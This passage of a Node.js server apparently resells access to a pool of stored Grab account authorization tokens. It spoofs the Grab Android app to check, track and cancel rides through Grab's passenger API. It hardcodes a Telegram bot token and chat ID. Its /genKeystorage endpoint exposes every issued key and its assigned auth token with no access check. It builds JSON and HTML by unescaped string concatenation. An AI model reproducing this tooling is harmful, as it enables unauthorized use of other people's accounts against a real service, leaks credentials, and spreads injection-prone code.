            var cancelSure = await Request('https://api.grab.com/api/v3/public/validatePaxCancellation', {
                method:'POST',
                postfields: '{"bookingCode":"' + bookId + '","cancelReasonID":' + id + ',"cancelReasonType":"static","dimension":"xxxhdpi","paymentTypeID":"260789879"}',
                headers: [
                    'Content-Type: application/json; charset=UTF-8',
                    'X-Mts-Ssid: ' + AUTH,
                    'Authorization: ' + AUTH,
                    'User-Agent: Grab/5.335.0 (Android 11; Build 91095616)',
                ],
            });
            var jsonCancel = JSON.parse(cancelSure);
            
            var cancel = await Request('https://p.grabtaxi.com/api/passenger/v3/rides/' + bookId, {
                method: 'DELETE',
                postfields: '{"cancellationFeeSalt":"' + jsonCancel.salt + '","passengerFeedback":{"comment":null,"mcqResponses":[' + id + '],"type":"CANCEL_REASON"},"reason":null}',
                headers: [
                    'Content-Type: application/json; charset=UTF-8',
                    'X-Mts-Ssid: ' + AUTH,
                    'Authorization: ' + AUTH,
                    'User-Agent: Grab/5.335.0 (Android 11; Build 91095616)',
                ],
            });
            console.log(cancel)
            var j = JSON.parse(cancel);
            if (j.cancellationFeePayment && j.cancellationFeePayment.error === '') {
                socket.emit('cancelStatus', {
                    status: true,
                    message: 'Booking has been canceled.'
                });
            } else {
                socket.emit('cancelStatus', {
                    status: true,
                    message: cancel
                });
            }
        } catch (err){
            socket.emit('cancelStatus', {
                status: false,
                message: err
            }); 
        }
    });
    socket.on('allocated', async (key, link, price) => {
        const message = `*🚖 Grab Car Allocated!*\n\n*Price:* ${price}\n*Username:* @${genKeys[key]['user']}\n*🔑 Key:* ${key}\n*🔗 Link:* [Click here](${link})`;
        try {
            await fetch(`https://api.telegram.org/bot5427962497:AAFQAlN3TMpCJEIJ-IEvwgaCx8J-UJV3YkE/sendMessage?chat_id=-1002288680130&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
        } catch {

        }
    });
    socket.on('getKey', async (key) => {
        socket.emit('key', KEYS[key]);
    });
});
const cleanExpiredKeys = () => {
    const now = Date.now();
    for (const [key, value] of Object.entries(genKeys)) {
        if (now - value.timestamp > 3 * 60 * 1000) {
            console.log(`Removing expired key: ${key}`);
            delete genKeys[key];
        }
    }
};
setInterval(cleanExpiredKeys, 60 * 1000);
app.get('/generateKey', (req, res) => {
    const keyName = req.query.keyName;
    if (!keyName) {
        return res.status(400).send({ error: 'Key name is required' });
    }
    const tempKey = `tempkey_${Math.random().toString(36).substring(2)}`;
    const authKeys = Object.keys(KEYS);
    const assignedAuth = KEYS[authKeys[Math.floor(Math.random() * authKeys.length)]];
    genKeys[keyName + '_' + tempKey] = {
        user: keyName,
        key: tempKey,
        auth: assignedAuth,
        timestamp: Date.now() 
    };
    res.send({ keyName, tempKey });
});
async function checkBookingStatus(key) {
    try {
        console.log(key);
        var response = await Request('https://p.grabtaxi.com/api/passenger/v3/current', {
            headers: [
                'X-Mts-Ssid: ' + KEYS[key],
                'Authorization: ' + KEYS[key],
                'User-Agent: Grab/5.335.0 (Android 11; Build 91095616)',
            ],
        });

        console.log(response);
        var ridesData = JSON.parse(response);

        // Extract active ride booking ID if available
        if (ridesData.rides && Array.isArray(ridesData.rides.active) && ridesData.rides.active.length > 0) {
            const activeBookingId = ridesData.rides.active[0]; // Get the first active booking ID
            return { isActive: true, bookingId: activeBookingId }; // Return active status and booking ID
        }
        return { isActive: false, bookingId: null }; // Inactive status
    } catch (error) {
        console.error(`Error fetching booking status for key ${key}:`, error);
        return { isActive: false, bookingId: null }; // Default to inactive on error
    }
}
app.get('/dashboard', async (req, res) => {
    const statuses = [];

    // Loop through keys and check booking status
    for (const key in KEYS) {
        const { isActive, bookingId } = await checkBookingStatus(key);
        statuses.push({ key, isActive, bookingId });
    }

    // Generate the HTML content dynamically
    const dashboardHtml = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Dashboard</title>
            <link rel="stylesheet" href="/css/dashboard.css">
        </head>
        <body>
            <div class="container">
                ${statuses.map(status => `
                    <div class="card ${status.isActive ? 'active' : 'inactive'}">
                        <h3>${status.key}</h3>
                        <p>${status.isActive ? 'Active' : 'Inactive'}</p>
                        ${status.isActive ? `
                            <div class="actions">
                                <a href="/track/${status.bookingId}?key=${status.key}">Track</a>
                                <button onclick="cancelRide('${status.key}', '${status.bookingId}')">Cancel</button>
                            </div>
                        ` : ''}
                    </div>
                `).join('')}
            </div>
            <script>
                function cancelRide(key, bookingId) {
                    const cancelReasonId = prompt('Enter cancellation reason ID:');
                    if (!cancelReasonId) {
                        alert('Cancellation reason ID is required.');
                        return;
                    }

                    if (confirm('Are you sure you want to cancel this ride?')) {
                        fetch('/cancel', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({ key, bookingId, reasonId: cancelReasonId }),
                        })
                        .then(response => response.json())
                        .then(data => {
                            alert(JSON.stringify(data.message));
                            window.location.reload();
                        })
                        .catch(err => {
                            alert('Error cancelling ride: ' + err.message);
                        });
                    }
                }
            </script>
        </body>
        </html>
    `;

    // Send the HTML content
    res.send(dashboardHtml);
});
app.post('/cancel', async (req, res) => {
    try {
        const { key, bookingId, reasonId } = req.body;
        if (!key || !bookingId || !reasonId) {
            return res.status(400).json({ status: false, message: 'Missing required fields.' });
        }
        console.log(key);
        const AUTH = KEYS[key];
        if (!AUTH) {
            return res.status(401).json({ status: false, message: 'Invalid key or authorization failed.' });
        }
        const validateResponse = await Request('https://api.grab.com/api/v3/public/validatePaxCancellation', {
            method: 'POST',
            postfields: '{"bookingCode":"' + bookingId + '","cancelReasonID":' + reasonId + ',"cancelReasonType":"static","dimension":"xxxhdpi","paymentTypeID":"260789879"}',
            headers: [
                `Content-Type: application/json; charset=UTF-8`,
                `X-Mts-Ssid: ${AUTH}`,
                `Authorization: ${AUTH}`,
                `User-Agent: Grab/5.335.0 (Android 11; Build 91095616)`,
            ],
        });
        const validateJson = JSON.parse(validateResponse);
        const cancelResponse = await Request(`https://p.grabtaxi.com/api/passenger/v3/rides/${bookingId}`, {
            method: 'DELETE',
            postfields: '{"cancellationFeeSalt":"' + validateJson.salt + '","passengerFeedback":{"comment":null,"mcqResponses":[' + reasonId + '],"type":"CANCEL_REASON"},"reason":null}',
            headers: [
                `Content-Type: application/json; charset=UTF-8`,
                `X-Mts-Ssid: ${AUTH}`,
                `Authorization: ${AUTH}`,
                `User-Agent: Grab/5.335.0 (Android 11; Build 91095616)`,
            ],
        });
        console.log(cancelResponse);
        const cancelJson = JSON.parse(cancelResponse);
        if (cancelJson.cancellationFeePayment && cancelJson.cancellationFeePayment.error === '') {
            return res.json({ status: true, message: 'Booking has been canceled.' });
        }
        res.json({ status: false, message: cancelJson });
    } catch (error) {
        console.error('Error in cancellation:', error);
        res.status(500).json({ status: false, message: 'Internal server error.' });
    }
});
app.get('/track/:bookingId', async (req, res) => {
    const { bookingId } = req.params;
    const { key } = req.query; 
    console.log(bookingId)
    if (!key || !KEYS[key]) {
        return res.status(400).json({
            success: false,
            message: 'Missing or invalid key.',
        });
    }
    const AUTH = KEYS[key];
    try {
        const response = await Request(`https://api.grab.com/api/v1/safety/sharemyride/passenger?bookingCode=${bookingId}`, {
            header: 1,
            headers: [
                'User-Agent: Grab/5.335.0 (Android 11; Build 91095616)',
                'X-Mts-Ssid: ' + AUTH,
                'Authorization: ' + AUTH,
            ],
        });
        console.log(response);
        const sharedLinkData = JSON.parse(response);
        res.json({
            success: true,
            sharedLink: sharedLinkData.link,
        });
    } catch (error) {
        console.error(`Error fetching shared ride link for booking ID ${bookingId}:`, error);
        res.status(500).json({
            success: false,
            message: 'Failed to fetch shared ride link.',
        });
    }
});
app.get('/genKeystorage', (req, res) => {
    cleanExpiredKeys();
    res.json(genKeys);
});
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '/assets/html/welcome.html'));
});
app.get('/book', (req, res) => {
    res.sendFile(path.join(__dirname, '/assets/html/index.html'));
});
app.get('/css/styles.css', (req, res) => {
    res.sendFile(path.join(__dirname, '/assets/css/styles.css'));
});
app.get('/css/dashboard.css', (req, res) => {
    res.sendFile(path.join(__dirname, '/assets/css/dashboard.css'));
});
app.get('/css/front.css', (req, res) => {
    res.sendFile(path.join(__dirname, '/assets/css/front.css'));
});
app.get('/js/script.js', (req, res) => {
    res.sendFile(path.join(__dirname, '/assets/js/script.js'));
});
app.get('/js/front.js', (req, res) => {
    res.sendFile(path.join(__dirname, '/assets/js/front.js'));
});
server.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
